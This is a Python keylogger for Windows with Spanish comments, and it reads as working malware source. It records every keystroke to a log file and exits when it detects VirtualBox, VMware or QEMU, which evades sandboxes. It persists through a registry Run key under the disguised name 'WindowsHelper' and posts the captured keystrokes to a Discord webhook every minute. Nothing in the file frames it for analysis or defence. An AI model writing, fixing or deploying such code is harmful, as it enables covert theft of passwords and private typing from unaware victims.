import pynput
from pynput.keyboard import Key, Listener
import logging
import requests
import time
import threading
import os
import sys
import winreg

WEBHOOK = ""  # Pon aquí tu webhook de Discord si lo usas
LOG_FILE = "KeyStrokes.txt"

# Configuración del logging
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format="%(asctime)s - %(message)s"
)

def is_vm():
    vm_files = ["vbox", "vmware", "qemu"]
    for f in vm_files:
        if os.path.exists(f"C:\\Windows\\System32\\drivers\\{f}.sys"):
            return True
    return False

if is_vm():
    sys.exit()

def add_to_startup():
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
            # CORREGIDO: sys.executable es la ruta del intérprete, no el script
            # Usamos __file__ para obtener la ruta del script actual
            winreg.SetValueEx(regkey, "WindowsHelper", 0, winreg.REG_SZ, f'"{sys.executable}" "{os.path.abspath(__file__)}"')
    except Exception as e:
        logging.error(f"Error en startup: {e}")

add_to_startup()

def send_logs():
    if not WEBHOOK:
        return

    try:
        with open(LOG_FILE, "r") as f:
            content = f.read()
        if content.strip():
            if len(content) > 1900:
                content = content[-1900:]
            # CORREGIDO: La indentación estaba mal
            response = requests.post(WEBHOOK, json={"content": f"```{content}```"})
            if response.status_code == 204:
                open(LOG_FILE, "w").close()
    except Exception as e:
        logging.error(f"Send failed: {e}")

def auto_send():
    while True:
        time.sleep(60)
        send_logs()

threading.Thread(target=auto_send, daemon=True).start()

def on_press(key):
    try:
        if key == Key.space:
            logging.info(" ")
        elif key == Key.enter:
            logging.info("\n")
        elif key == Key.backspace:
            logging.info("[←]")
        elif key == Key.tab:
            logging.info("[TAB] ")
        elif key == Key.shift or key == Key.shift_r:
            logging.info("[⇧]")
        elif key == Key.ctrl_l or key == Key.ctrl_r:
            logging.info("[Ctrl]")
        elif key == Key.alt_l or key == Key.alt_r:
            logging.info("[Alt]")
        elif key == Key.cmd or key == Key.cmd_r:
            logging.info("[Win]")
        elif key == Key.esc:
            logging.info("[Esc]")
        elif key == Key.up:
            logging.info("[↑]")
        elif key == Key.down:
            logging.info("[↓]")
        elif key == Key.left:
            logging.info("[←]")
        elif key == Key.right:
            logging.info("[→]")
        elif key == Key.delete:
            logging.info("[Del]")
        elif key == Key.home:
            logging.info("[Home]")
        elif key == Key.end:
            logging.info("[End]")
        elif key == Key.page_up:
            logging.info("[PgUp]")
        elif key == Key.page_down:
            logging.info("[PgDn]")
        else:
            logging.info(str(key).replace("'", ""))
    except Exception as e:
        logging.error(f"Error: {e}")

with Listener(on_press=on_press) as listener:
    listener.join()
